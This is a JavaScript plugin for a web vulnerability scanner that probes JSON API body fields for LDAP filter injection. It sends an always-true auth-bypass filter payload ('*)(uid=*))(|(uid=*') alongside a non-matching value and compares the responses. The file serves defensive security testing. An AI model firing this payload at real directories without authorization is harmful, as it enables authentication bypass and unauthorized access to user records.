/* ---
id: ldap-injection-json-body
name: LDAP Injection via JSON Body Field
description: Detects LDAP filter injection when a JSON API body field is concatenated into a directory query, injecting an auth-bypass filter and comparing it against a non-matching value over three repeats.
author: GASH contributors
severity: high
tags: [ldap, injection, differential, json, api]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 60
phase: probe
order: 78
api_version: "1.0"
tests: tests/fixtures/ldap-injection-json-body/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/ldap/ldap-injection-json-body.js
// What: Tier 2 LDAP filter injection plugin for JSON request bodies.
// Why: The query-point LDAP plugin cannot reach a JSON API: the payload has to
//   be built into the object around the discovered field and sent as
//   application/json. The directory equivalent of an always-true filter
//   ("*)(uid=*))(|(uid=*") is compared against a value that cannot match, over
//   three repeats, so an ordinary "user not found" page never confirms.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const candidates = [];
  // Always-true filter closure versus a value that cannot exist.
  const TRUE_PAY = "*)(uid=*))(|(uid=*";
  const FALSE_PAY = "gash-no-such-entry-9f3a";
  const jsonContentType = "application/json";
  const maxSends = 60;
  const sendsPerPoint = 7; // 3 true + 3 false + 1 control
  let sends = 0;

  for (const point of points) {
    if (String(point.paramLocation || "").toLowerCase() !== "body") {
      continue;
    }
    if (!point.paramName) {
      continue;
    }
    if (sends + sendsPerPoint > maxSends) {
      break;
    }
    const name = point.paramName;
    const raw = (value) => ({
      url: point.url,
      method: point.method,
      paramName: "",
      paramLocation: "body",
      value: '{"' + name + '":"' + value + '"}',
      headers: { "Content-Type": jsonContentType },
    });
    const trueResps = [];
    const falseResps = [];
    for (let i = 0; i < 3; i++) {
      sends++;
      trueResps.push(probe.send(raw(TRUE_PAY)));
      sends++;
      falseResps.push(probe.send(raw(FALSE_PAY)));
    }
    // A body that simply echoes our value is noise, not injection proof.
    const echoes = (resps, pay) => resps.some((r) => r && r.body && r.body.indexOf(pay) !== -1);
    if (echoes(trueResps, TRUE_PAY) || echoes(falseResps, FALSE_PAY)) {
      continue;
    }
    sends++;
    const controlResp = probe.send(raw("gash-control-neutral"));
    const ev = host.oracles.differential(trueResps, falseResps, controlResp);
    if (ev) {
      candidates.push(host.candidate(point, "differential", ev));
    }
  }
  return candidates;
}
